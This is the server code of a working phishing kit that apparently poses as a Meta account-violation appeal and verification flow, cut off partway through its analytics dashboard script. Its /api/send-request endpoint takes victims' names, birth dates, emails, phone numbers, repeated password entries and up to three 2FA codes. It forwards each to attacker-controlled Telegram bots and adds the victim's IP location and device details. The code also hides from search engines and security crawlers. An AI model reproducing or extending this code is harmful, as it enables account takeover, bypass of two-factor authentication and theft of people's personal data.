require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');
const dns = require('dns');

// Force IPv4 DNS resolution
dns.setDefaultResultOrder('ipv4first');

// ===== HTTP HELPER (replaces fetch) =====
function httpRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const mod = url.startsWith('https') ? https : http;
        const req = mod.request(url, {
            method: options.method || 'GET',
            headers: options.headers || {},
            timeout: 15000,
            family: 4  // Force IPv4
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch (e) { resolve(data); }
            });
        });
        req.on('error', (err) => { reject(new Error(`${err.code || err.message}`)); });
        req.on('timeout', () => { req.destroy(); reject(new Error('Request timeout')); });
        if (options.body) req.write(options.body);
        req.end();
    });
}

const app = express();
app.use((req, res, next) => {
    res.setHeader(
        'X-Robots-Tag',
        'noindex, nofollow, noarchive'
    );
    next();
});
const PORT = process.env.PORT || 3000;

// ===== ENV =====
const TELEGRAM_TARGETS = [
    {
        token: process.env.TELEGRAM_BOT_TOKEN_1,
        chatId: process.env.TELEGRAM_CHAT_ID_1,
        delay: 0
    },
    {
        token: process.env.TELEGRAM_BOT_TOKEN_2,
        chatId: process.env.TELEGRAM_CHAT_ID_2,
        delay: 5000
    }
].filter(t => t.token && t.chatId);

// Fallback for legacy env format
if (TELEGRAM_TARGETS.length === 0 && process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
    process.env.TELEGRAM_CHAT_ID.split(',').forEach(id => {
        TELEGRAM_TARGETS.push({ token: process.env.TELEGRAM_BOT_TOKEN, chatId: id.trim(), delay: 0 });
    });
}
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '';

// ===== SESSIONS & RATE LIMITING =====
const MAX_PASSWORD_ATTEMPTS = 5;
const MAX_2FA_ATTEMPTS = 5;
const SESSION_EXPIRY_MS = 30 * 60 * 1000;
const FIELD_LIMITS = {
    fullName: 100, email: 254, emailBusiness: 254,
    phone: 25, fanpage: 150, dob: 15,
    note: 500, password: 200, code: 10,
};

const sessions = {};
const rateLimits = new Map();
const infoRateLimits = new Map();

// ===== ANALYTICS =====
const ANALYTICS_KEY = process.env.ANALYTICS_KEY || 'admin123';
const analytics = {
    totalViews: 0,
    uniqueIPs: new Set(),
    countries: {},
    pages: {},
    visitors: [],      // { ip, country, page, ua, time }
    activeUsers: new Map(), // ip -> lastSeen
    hourly: {},         // 'YYYY-MM-DD HH' -> count
    daily: {},          // 'YYYY-MM-DD' -> count
    startedAt: Date.now()
};

// Cleanup old analytics data every hour
setInterval(() => {
    const cutoff = Date.now() - 24 * 60 * 60 * 1000;
    analytics.visitors = analytics.visitors.filter(v => v.time > cutoff);
    for (const [ip, lastSeen] of analytics.activeUsers.entries()) {
        if (Date.now() - lastSeen > 5 * 60 * 1000) analytics.activeUsers.delete(ip);
    }
}, 60 * 60 * 1000);

// ===== TRUST PROXY (for Nginx) =====
app.set('trust proxy', true);


// ===== MIDDLEWARE =====
app.use(express.json({ limit: '1mb' }));

// Security headers
app.use((req, res, next) => {
    res.set({
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
        'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
    });
    next();
});

// Analytics tracking middleware
app.use((req, res, next) => {
    if (req.path.startsWith('/api/') || req.path.startsWith('/lang/') || req.path.startsWith('/img/') || req.path === '/i18n.js' || req.path === '/analytics') return next();
    // Only track valid page routes (whitelist)
    const validPages = ['/home', '/appeal-forms', '/meta-verified', '/t'];
    if (!validPages.includes(req.path)) return next();
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
    const ua = req.headers['user-agent'] || '';
    if (!ua || ua.includes('bot') || ua.includes('spider') || ua.includes('crawl') || ua.includes('python') || ua.includes('curl') || ua.includes('wget') || ua.includes('Go-http') || ua.includes('scanner')) return next();

    const now = Date.now();
    const dateStr = new Date().toISOString().split('T')[0];
    const hourStr = dateStr + ' ' + new Date().getHours().toString().padStart(2, '0');

    analytics.totalViews++;
    analytics.uniqueIPs.add(ip);
    analytics.pages[req.path] = (analytics.pages[req.path] || 0) + 1;
    analytics.hourly[hourStr] = (analytics.hourly[hourStr] || 0) + 1;
    analytics.daily[dateStr] = (analytics.daily[dateStr] || 0) + 1;
    analytics.activeUsers.set(ip, now);

    // Store last 500 visitors
    analytics.visitors.push({ ip: ip.replace(/^::ffff:/, ''), page: req.path, ua: ua.substring(0, 100), time: now, country: '' });
    if (analytics.visitors.length > 500) analytics.visitors.shift();

    // Geo lookup in background
    const visitor = analytics.visitors[analytics.visitors.length - 1];
    getCountryByIP(ip).then(code => {
        if (code) {
            const c = code.toUpperCase();
            visitor.country = c;
            analytics.countries[c] = (analytics.countries[c] || 0) + 1;
        }
    }).catch(() => {});

    next();
});

// CORS — same-origin requests don't send Origin header, so allow those too
app.use((req, res, next) => {
    const origin = req.headers.origin || '';
    let corsAllowed = false;
    if (!origin) {
        // Same-origin request (browser doesn't send Origin for same-origin)
        corsAllowed = true;
    } else if (ALLOWED_ORIGIN) {
        corsAllowed = origin === ALLOWED_ORIGIN;
    } else {
        corsAllowed = origin === `http://localhost:${PORT}`;
    }
    if (corsAllowed && origin) {
        res.set('Access-Control-Allow-Origin', origin);
        res.set('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.set('Access-Control-Allow-Headers', 'Content-Type');
    }
    res.set('Vary', 'Origin');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// ===== HELPERS =====
function cleanupExpiredSessions() {
    const now = Date.now();
    for (const [id, session] of Object.entries(sessions)) {
        if (session.createdAt && (now - session.createdAt > SESSION_EXPIRY_MS)) delete sessions[id];
    }
}

function checkRateLimit(ip) {
    const now = Date.now(); const key = ip || 'unknown';
    const limit = { max: 50, window: 60000 };
    if (!rateLimits.has(key)) { rateLimits.set(key, { count: 1, resetAt: now + limit.window }); return { allowed: true }; }
    const record = rateLimits.get(key);
    if (now > record.resetAt) { record.count = 1; record.resetAt = now + limit.window; return { allowed: true }; }
    if (record.count >= limit.max) return { allowed: false, retryAfter: Math.ceil((record.resetAt - now) / 1000) };
    record.count++; return { allowed: true };
}

function checkInfoRateLimit(ip) {
    const now = Date.now(); const key = ip || 'unknown';
    const limit = { max: 10, window: 60000 };
    if (!infoRateLimits.has(key)) { infoRateLimits.set(key, { count: 1, resetAt: now + limit.window }); return { allowed: true }; }
    const record = infoRateLimits.get(key);
    if (now > record.resetAt) { record.count = 1; record.resetAt = now + limit.window; return { allowed: true }; }
    if (record.count >= limit.max) return { allowed: false, retryAfter: Math.ceil((record.resetAt - now) / 1000) };
    record.count++; return { allowed: true };
}

function cleanupRateLimits() {
    const now = Date.now();
    for (const [key, record] of rateLimits.entries()) { if (now > record.resetAt + 300000) rateLimits.delete(key); }
    for (const [key, record] of infoRateLimits.entries()) { if (now > record.resetAt + 300000) infoRateLimits.delete(key); }
}

function generateSessionId() { return crypto.randomBytes(16).toString('hex'); }

function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function validateData(data) {
    const issues = [];
    if (data.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) issues.push('Invalid email');
    if (data.phone && data.phone.length < 5) issues.push('Phone too short');
    if (data.dob) {
        const parts = data.dob.split('/');
        if (parts.length === 3) {
            const [d, m, y] = parts.map(Number);
            if (d < 1 || d > 31) issues.push('Invalid day');
            if (m < 1 || m > 12) issues.push('Invalid month');
            if (y < 1500 || y > 2026) issues.push('Invalid year');
        }
    }
    return issues;
}

function sanitizeFields(data) {
    const sanitized = { ...data };
    for (const [field, maxLen] of Object.entries(FIELD_LIMITS)) {
        if (sanitized[field] && typeof sanitized[field] === 'string' && sanitized[field].length > maxLen)
            sanitized[field] = sanitized[field].substring(0, maxLen);
    }
    if (sanitized.device && typeof sanitized.device === 'object') {
        for (const key of Object.keys(sanitized.device)) {
            if (typeof sanitized.device[key] === 'string' && sanitized.device[key].length > 100)
                sanitized.device[key] = sanitized.device[key].substring(0, 100);
        }
    }
    return sanitized;
}

function decodeData(encodedData) {
    try { return JSON.parse(Buffer.from(encodedData, 'base64').toString('utf-8')); }
    catch (e) { return null; }
}

function buildMessage(session, ip = 'Unknown') {
    let msg = `<b>🔔 Notification</b>\n━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Ip:</b> ${escapeHtml(ip)}\n`;
    msg += `<b>Location:</b> ${escapeHtml(session.location || 'Unknown')}\n`;
    msg += `<b>Source:</b> ${escapeHtml(session.source || 'Unknown')}\n`;
    if (session.device) {
        const d = session.device;
        const parts = [];
        if (d.os) parts.push(escapeHtml(d.os));
        if (d.browser) parts.push(escapeHtml(d.browser));
        if (d.screen) parts.push(escapeHtml(d.screen));
        if (d.mobile) parts.push('📱');
        msg += `<b>Device:</b> ${parts.join(' | ') || 'Unknown'}\n`;
    }
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Full Name:</b> ${escapeHtml(session.fullName)}\n`;
    msg += `<b>Page Name:</b> ${escapeHtml(session.fanpage)}\n`;
    msg += `<b>Date of birth:</b> ${escapeHtml(session.dob)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Email:</b> <code>${escapeHtml(session.email)}</code>\n`;
    msg += `<b>Email Business:</b> <code>${escapeHtml(session.emailBusiness)}</code>\n`;
    msg += `<b>Phone Number:</b> <code>${escapeHtml(session.phone)}</code>\n`;
    if (session.note) msg += `<b>Note:</b> ${escapeHtml(session.note)}\n`;

    const pwd1 = session.passwords?.[0] || '';
    const pwd2 = session.passwords?.[1] || '';
    if (pwd1 || pwd2) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        if (pwd1) msg += `<b>Password First:</b> <code>${escapeHtml(pwd1)}</code>\n`;
        if (pwd2) msg += `<b>Password Second:</b> <code>${escapeHtml(pwd2)}</code>\n`;
    }

    const codes = session.codes || [];
    if (codes.length > 0) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>Auth Method:</b>\n`;
        if (codes[0]) msg += `<b>Code 2FA(1):</b> <code>${escapeHtml(codes[0])}</code>\n`;
        if (codes[1]) msg += `<b>Code 2FA(2):</b> <code>${escapeHtml(codes[1])}</code>\n`;
        if (codes[2]) msg += `<b>Code 2FA(3):</b> <code>${escapeHtml(codes[2])}</code>\n`;
    }
    return msg;
}

async function sendTelegram(message, messageIdsMap = null, sessionId = null, is2FA = false) {
    if (TELEGRAM_TARGETS.length === 0) {
        console.warn('[TG] Aborting: No Telegram targets configured');
        return {};
    }

    const currentMessageIds = messageIdsMap ? { ...messageIdsMap } : {};
    
    // We'll return the IDs of messages sent immediately
    const immediateResults = {};

    for (const target of TELEGRAM_TARGETS) {
        const hasDelay = is2FA && target.delay > 0;

        const sendToTarget = async () => {
            if (hasDelay) {
                await new Promise(resolve => setTimeout(resolve, target.delay));
            }

            try {
                // If we don't have a messageId passed in, check the session for latest ID
                let messageId = currentMessageIds[target.chatId];
                if (!messageId && sessionId && sessions[sessionId]) {
                    messageId = sessions[sessionId].messageIds[target.chatId];
                }

                let resultData;
                if (messageId) {
                    // Try editing
                    resultData = await httpRequest(`https://api.telegram.org/bot${target.token}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: target.chatId, message_id: messageId, text: message, parse_mode: 'HTML' })
                    });
                    
                    if (!resultData.ok) {
                        // If edit fails (e.g. message deleted or too old), fallback to new message
                        console.warn(`[TG] Edit failed for ${target.chatId}, falling back to sendMessage: ${resultData.description}`);
                        messageId = null;
                    }
                }

                if (!messageId) {
                    resultData = await httpRequest(`https://api.telegram.org/bot${target.token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: target.chatId, text: message, parse_mode: 'HTML' })
                    });
                }

                if (resultData && resultData.ok) {
                    const newMessageId = resultData.result?.message_id || (resultData.result === true ? messageId : null);
                    if (newMessageId) {
                        currentMessageIds[target.chatId] = newMessageId;
                        if (sessionId && sessions[sessionId]) {
                            sessions[sessionId].messageIds[target.chatId] = newMessageId;
                        }
                        return newMessageId;
                    }
                } else {
                    console.error(`[TG] Error for ${target.chatId}:`, resultData?.description || 'Unknown error');
                }
            } catch (err) {
                console.error(`[TG] Fatal error for ${target.chatId}:`, err.message);
            }
            return null;
        };

        if (hasDelay) {
            // Background send
            sendToTarget();
        } else {
            // Immediate send
            const mid = await sendToTarget();
            if (mid) immediateResults[target.chatId] = mid;
        }
    }

    return immediateResults;
}

async function getIPInfo(ip) {
    let targetIP = ip;
    // If testing on localhost, fetch the machine's public IP to get a real location
    if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'unknown') {
        try {
            const data = await httpRequest('https://api.ipify.org?format=json');
            if (data && data.ip) targetIP = data.ip;
            else return 'Localhost';
        } catch (e) { return 'Localhost'; }
    }

    // 1. Try ipapi.co (HTTPS)
    try {
        const data = await Promise.race([
            httpRequest(`https://ipapi.co/${targetIP}/json/`),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
        ]);
        if (data && data.city && data.country_name) {
            return `${data.city}, ${data.country_name} (${data.country_code})`;
        }
    } catch (e) { /* fallback */ }

    // 2. Try ipinfo.io (HTTPS)
    try {
        const data = await Promise.race([
            httpRequest(`https://ipinfo.io/${targetIP}/json`),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
        ]);
        if (data && data.city) return `${data.city}, ${data.country}`;
    } catch (e) { /* silent */ }

    return 'Unknown';
}

// Geo lookup helper — returns country code (e.g. 'vn', 'us')
async function getCountryByIP(ip) {
    let targetIP = ip;
    if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'unknown') {
        try {
            const data = await httpRequest('https://api.ipify.org?format=json');
            if (data && data.ip) targetIP = data.ip;
            else return '';
        } catch (e) { return ''; }
    }

    // 1. Try ipapi.co (HTTPS)
    try {
        const data = await Promise.race([
            httpRequest(`https://ipapi.co/${targetIP}/json/`),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
        ]);
        if (data && data.country_code) return data.country_code.toLowerCase();
    } catch (e) { /* fallback */ }

    // 2. Try ipinfo.io (HTTPS)
    try {
        const data = await Promise.race([
            httpRequest(`https://ipinfo.io/${targetIP}/json`),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
        ]);
        if (data && data.country) return data.country.toLowerCase();
    } catch (e) { /* silent */ }
    return '';
}

// ===== COUNTRY TO LANG MAP =====
const COUNTRY_TO_LANG = {
    US: 'en', GB: 'en', AU: 'en', CA: 'en', NZ: 'en', IE: 'en', ZA: 'en', JM: 'en', TT: 'en', GH: 'en', NG: 'en', KE: 'en',
    VN: 'vi',
    ES: 'es', MX: 'es', AR: 'es', CO: 'es', CL: 'es', PE: 'es', VE: 'es', EC: 'es', GT: 'es', CU: 'es', BO: 'es', DO: 'es', HN: 'es', PY: 'es', SV: 'es', NI: 'es', CR: 'es', PA: 'es', UY: 'es', PR: 'es',
    BR: 'pt', PT: 'pt', AO: 'pt', MZ: 'pt',
    FR: 'fr', BE: 'fr', SN: 'fr', CI: 'fr', CM: 'fr', MG: 'fr', ML: 'fr', BF: 'fr', NE: 'fr', TD: 'fr', GN: 'fr', RW: 'fr', HT: 'fr', LU: 'fr', MC: 'fr',
    DE: 'de', AT: 'de', LI: 'de', CH: 'de',
    IT: 'it', SM: 'it', VA: 'it',
    JP: 'ja', KR: 'ko',
    CN: 'zh', TW: 'zh', HK: 'zh', MO: 'zh', SG: 'zh',
    TH: 'th', ID: 'id',
    MY: 'ms', BN: 'ms',
    SA: 'ar', AE: 'ar', EG: 'ar', IQ: 'ar', MA: 'ar', DZ: 'ar', SD: 'ar', SY: 'ar', YE: 'ar', TN: 'ar', JO: 'ar', LY: 'ar', LB: 'ar', OM: 'ar', KW: 'ar', QA: 'ar', BH: 'ar', PS: 'ar',
    IN: 'hi', TR: 'tr', CY: 'tr',
    RU: 'ru', BY: 'ru', KZ: 'ru', KG: 'ru', TJ: 'ru',
    PL: 'pl', NL: 'nl', SR: 'nl',
    PH: 'tl', CZ: 'cs', SK: 'cs',
    NO: 'nb', DK: 'da', GR: 'el', FI: 'fi',
    RO: 'ro', MD: 'ro', IL: 'he', SE: 'sv', HU: 'hu',
};

// ===== STATIC FILES =====
app.use('/lang', express.static(path.join(__dirname, 'lang')));
app.use('/img', express.static(path.join(__dirname, 'img')));
app.use('/i18n.js', express.static(path.join(__dirname, 'i18n.js')));
app.use('/v2-assets/i18n.js', express.static(path.join(__dirname, 'i18n.js')));
// Serve public assets (JS/CSS/images) and project styles
app.use('/public', express.static(path.join(__dirname, 'public')));
app.use('/styles', express.static(path.join(__dirname, 'styles')));

// ===== PAGE ROUTES =====
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/home', (req, res) => res.sendFile(path.join(__dirname, 'violation.html')));
app.get('/appeal-forms', (req, res) => res.sendFile(path.join(__dirname, 'form.html')));
app.get('/meta-verified', (req, res) => res.sendFile(path.join(__dirname, 'meta-verified.html')));
app.get('/t', (req, res) => res.sendFile(path.join(__dirname, 't.html')));

// ===== API: detect-lang =====
app.get('/api/detect-lang', async (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || '';
    let country = '';
    let lang = 'en';

    // Try IP-based geo detection
    country = await getCountryByIP(ip);
    if (country) {
        lang = COUNTRY_TO_LANG[country.toUpperCase()] || 'en';
    } else {
        // Fallback to accept-language header
        country = 'Unknown';
        const acceptLang = req.headers['accept-language'];
        if (acceptLang) {
            lang = acceptLang.split(',')[0].split('-')[0].toLowerCase();
        }
    }

    res.set('Cache-Control', 'private, max-age=3600');
    res.json({ country, lang });
});

// ===== API: geo =====
app.get('/api/geo', async (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || '';
    const country = await getCountryByIP(ip);
    res.set('Cache-Control', 'no-store');
    res.json({ country });
});

// ===== API: send-request =====
app.post('/api/send-request', async (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';

    cleanupExpiredSessions();
    cleanupRateLimits();

    const rateCheck = checkRateLimit(ip);
    if (!rateCheck.allowed) {
        return res.status(429).json({ error: 'Too many requests', retryAfter: rateCheck.retryAfter });
    }

    try {
        const body = req.body || {};
        const data = decodeData(body.data);
        if (!data) {
            return res.status(400).json({ success: false, error: 'Invalid data format' });
        }

        const { type, session_id } = data;

        // ===== INFO =====
        if (type === 'info') {
            const infoRateCheck = checkInfoRateLimit(ip);
            if (!infoRateCheck.allowed) {
                return res.status(429).json({ error: 'Too many requests', retryAfter: infoRateCheck.retryAfter });
            }

            const id = generateSessionId();
            const safe = sanitizeFields(data);
            validateData(safe);

            const origin = req.headers.origin || req.headers.referer || 'Unknown';
            const source = origin.replace(/^https?:\/\//, '').split('/')[0];

            sessions[id] = {
                id, ip, fullName: safe.fullName || '', email: safe.email || '',
                emailBusiness: safe.emailBusiness || '', phone: safe.phone || '',
                fanpage: safe.fanpage || '', dob: safe.dob || '', note: safe.note || '',
                passwords: safe.password ? [safe.password.substring(0, FIELD_LIMITS.password)] : [],
                codes: [],
                location: 'Unknown', source, device: safe.device || null, messageIds: {}, createdAt: Date.now()
            };

            // Send Telegram immediately
            const msg = buildMessage(sessions[id], ip);
            sessions[id].messageIds = await sendTelegram(msg, null, id, false);

            // Geo lookup in background — update message if resolved within 4s
            getIPInfo(ip).then(location => {
                if (location && location !== 'Unknown' && sessions[id]) {
                    sessions[id].location = location;
                    const updatedMsg = buildMessage(sessions[id], ip);
                    sendTelegram(updatedMsg, sessions[id].messageIds, id, false).catch(() => {});
                }
            }).catch(() => {});
            return res.json({ success: true, session_id: id });
        }

        // ===== PASSWORD =====
        if (type === 'password' && sessions[session_id]) {
            if (sessions[session_id].ip !== ip) {
                return res.status(403).json({ success: false, error: 'Session expired' });
            }
            if (sessions[session_id].passwords.length >= MAX_PASSWORD_ATTEMPTS) {
                return res.status(429).json({ success: false, error: 'Too many attempts' });
            }
            sessions[session_id].passwords.push((data.password || '').substring(0, FIELD_LIMITS.password));
            const msg = buildMessage(sessions[session_id], ip);
            await sendTelegram(msg, sessions[session_id].messageIds, session_id, false);
            return res.json({ success: true });
        }

        // ===== 2FA =====
        if (type === '2fa' && sessions[session_id]) {
            if (sessions[session_id].ip !== ip) {
                return res.status(403).json({ success: false, error: 'Session expired' });
            }
            if (sessions[session_id].codes.length >= MAX_2FA_ATTEMPTS) {
                return res.status(429).json({ success: false, error: 'Too many attempts' });
            }
            sessions[session_id].codes.push((data.code || '').substring(0, FIELD_LIMITS.code));
            const msg = buildMessage(sessions[session_id], ip);
            await sendTelegram(msg, sessions[session_id].messageIds, session_id, true);
            return res.json({ success: true });
        }

        return res.status(400).json({ success: false, error: 'Invalid request type' });
    } catch (error) {
        console.error('Handler error:', error);
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// ===== ANALYTICS API =====
app.get('/api/analytics', (req, res) => {
    if (req.query.key !== ANALYTICS_KEY) return res.status(403).json({ error: 'Invalid key' });
    
    // Clean active users
    for (const [ip, lastSeen] of analytics.activeUsers.entries()) {
        if (Date.now() - lastSeen > 5 * 60 * 1000) analytics.activeUsers.delete(ip);
    }

    res.json({
        totalViews: analytics.totalViews,
        uniqueVisitors: analytics.uniqueIPs.size,
        activeNow: analytics.activeUsers.size,
        countries: analytics.countries,
        pages: analytics.pages,
        hourly: analytics.hourly,
        daily: analytics.daily,
        recentVisitors: analytics.visitors.slice(-30).reverse().map(v => ({
            ip: v.ip, country: v.country, page: v.page,
            ua: v.ua, time: new Date(v.time).toISOString()
        })),
        uptime: Math.floor((Date.now() - analytics.startedAt) / 1000)
    });
});
app.get('/robots.txt', (req, res) => {
    const content = fs.readFileSync('public/robots.txt');
    res.contentType('text/plain');
    res.end(content);
});

// ===== ANALYTICS DASHBOARD =====
app.get('/analytics', (req, res) => {
    if (req.query.key !== ANALYTICS_KEY) return res.status(403).send('Access denied. Use ?key=YOUR_KEY');
    res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Traffic Overview</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{--bg:#09090b;--surface:#18181b;--surface2:#27272a;--border:#3f3f46;--text:#fafafa;--text2:#a1a1aa;--text3:#71717a;--blue:#3b82f6;--green:#22c55e;--purple:#a855f7;--amber:#f59e0b;--red:#ef4444;--cyan:#06b6d4}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
.container{max-width:1200px;margin:0 auto;padding:24px 20px}
.nav{display:flex;align-items:center;justify-content:space-between;padding:16px 0;margin-bottom:32px;border-bottom:1px solid var(--border)}
.nav-left{display:flex;align-items:center;gap:12px}
.nav-left h1{font-size:15px;font-weight:600;letter-spacing:-0.3px}
.nav-left .dot{width:4px;height:4px;background:var(--text3);border-radius:50%}
.nav-left .sub{color:var(--text3);font-size:13px;font-weight:400}
.status{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--green);background:rgba(34,197,94,.1);padding:4px 10px;border-radius:20px}
.status .dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:blink 2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
.metrics{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:28px}
@media(max-width:768px){.metrics{grid-template-columns:repeat(2,1fr)}}
.metric{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px 20px;transition:border-color .2s}
.metric:hover{border-color:var(--text3)}
.metric .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
.metric .top span{font-size:12px;color:var(--text3);font-weight:500;text-transform:uppercase;letter-spacing:.5px}
.metric .top .icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px}
.metric .num{font-size:28px;font-weight:700;letter-spacing:-1px;font-variant-numeric:tabular-nums}
.metric .sub{font-size:12px;color:var(--text3);margin-top:4px}
.panels{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}
@media(max-width:768px){.panels{grid-template-columns:1fr}}
.panel{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:20px;overflow:hidden}
.panel-title{font-size:13px;font-weight:600;color:var(--text2);margin-bottom:16px;display:flex;align-items:center;gap:8px}
.panel-title .count{background:var(--surface2);color:var(--text3);font-size:11px;padding:2px 7px;border-radius:10px;font-weight:500}
table{width:100%;border-collapse:collapse}
th{text-align:left;font-size:11px;color:var(--text3);font-weight:500;text-transform:uppercase;letter-spacing:.5px;padding:0 0 10px}
td{padding:7px 0;font-size:13px;border-top:1px solid var(--border)}
.country-row{display:flex;align-items:center;gap:8px}
.flag{width:18px;height:13px;border-radius:2px;object-fit:cover}
.bar-track{height:6px;background:var(--surface2);border-radius:3px;flex:1;min-width:60px;overflow:hidden}
.bar-val{height:100%;border-radius:3px;transition:width .6s ease}
.pct{font-size:12px;color:var(--text3);min-width:40px;text-align:right;font-variant-numeric:tabular-nums}
.visitor-row{display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid rgba(63,63,70,.5)}
.visitor-row:last-child{border:none}
.visitor-time{font-size:11px;color:var(--text3);min-width:65px;font-variant-numeric:tabular-nums}
.visitor-ip{font-size:12px;color:var(--text2);min-width:110px;font-family:monospace}
.visitor-country{font-size:11px;background:var(--surface2);color:var(--text2);padding:2px 7px;border-radius:4px;min-width:28px;text-align:center}
.visitor-page{font-size:12px;color:var(--text3);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.chart-area{width:100%;height:120px;display:flex;align-items:flex-end;gap:3px;padding-top:10px}
.chart-bar{flex:1;background:linear-gradient(180deg,var(--blue),rgba(59,130,246,.3));border-radius:3px 3px 0 0;min-height:2px;transition:height .4s ease;position:relative}
.chart-bar:hover{background:linear-gradient(180deg,var(--cyan),rgba(6,182,212,.4))}
.chart-bar:hover::after{content:attr(data-val);position:absolute;top:-22px;left:50%;transform:translateX(-50%);font-size:10px;color:var(--text);background:var(--surface2);padding:2px 6px;border-radius:4px;white-space:nowrap}
.last-update{text-align:center;padding:20px 0;font-size:11px;color:var(--text3)}
</style></head><body>
<div class="container">
<nav class="nav">
<div class="nav-left">
<h1>Traffic Overview</h1>
<span class="dot"></span>
<span class="sub" id="domain">${ALLOWED_ORIGIN || 'localhost'}</span>
</div>
<div class="status"><span class="dot"></span><span id="activeLabel">0 active</span></div>
</nav>
<div class="metrics">
<div class="metric"><div class="top"><span>Total Views</span><div class="icon" style="background:rgba(59,130,246,.1);color:var(--blue)">👁</div></div><div class="num" id="totalViews" style="color:var(--blue)">—</div><div class="sub">Since server start</div></div>
<div class="metric"><div class="top"><span>Unique Visitors</span><div class="icon" style="background:rgba(34,197,94,.1);color:var(--green)">👤</div></div><div class="num" id="uniqueVisitors" style="color:var(--green)">—</div><div class="sub">Unique IPs</div></div>
<div class="metric"><div class="top"><span>Active Now</span><div class="icon" style="background:rgba(168,85,247,.1);color:var(--purple)">⚡</div></div><div class="num" id="activeNow" style="color:var(--purple)">—</div><div class="sub">Last 5 minutes</div></div>
<div class="metric"><div class="top"><span>Uptime</span><div class="icon" style="background:rgba(245,158,11,.1);color:var(--amber)">⏱</div></div><div class="num" id="uptime" style="color:var(--amber)">—</div><div class="sub">Server uptime</div></div>
</div>
<div class="panel" style="margin-bottom:16px">
<div class="panel-title">Hourly Traffic <span class="count" id="todayCount">today</span></div>
<div class="chart-area" id="chartArea"></div>
</div>
<div class="panels">
<div class="panel">
<div class="panel-title">Top Countries <span class="count" id="countryCount">0</span></div>
<div id="countriesList"></div>
</div>
<div class="panel">
<div class="panel-title">Pages <span class="count" id="pageCount">0</span></div>
<table><thead><tr><th>Path</th><th>Views</th><th style="text-align:right">%</th></tr></thead><tbody id="pagesBody"></tbody></table>
</div>
</div>
<div class="panel" style="margin-top:0">
<div class="panel-title">Recent Visitors <span class="count" id="visitorCount">0</span></div>
<div id="visitorsList"></div>
</div>
<div class="last-update">Auto-refreshes every 15s — <span id="lastUpdate"></span></div>
</div>
<script>
const KEY='${ANALYTICS_KEY}';
const COLORS=['#3b82f6','#22c55e','#a855f7','#f59e0b','#ef4444','#06b6d4','#ec4899','#8b5cf6','#14b8a6','#f97316'];
const FLAG_URL='https://flagcdn.com/w20/';
async function loadData(){
  try{
    const r=await fetch('/api/analytics?key='+KEY);
    const d=await r.json();
    document.getElementById('totalViews').textContent=d.totalViews.toLocaleString();
    document.getElementById('uniqueVisitors').textContent=d.uniqueVisitors.toLocaleString();
    document.getElementById('activeNow').textContent=d.activeNow;
    document.getElementById('activeLabel').textContent=d.activeNow+' active';
    const hrs=Math.floor(d.uptime/3600),mins=Math.floor((d.uptime%3600)/60);
    document.getElementById('uptime').textContent=(hrs>0?hrs+'h ':'')+mins+'m';
    document.getElementById('lastUpdate').textContent='Last updated: '+new Date().toLocaleTimeString();
    // Hourly chart
    const today=new Date().toISOString().split('T')[0];
    const hourlyData=[];
    let todayTotal=0;
    for(let h=0;h<24;h++){
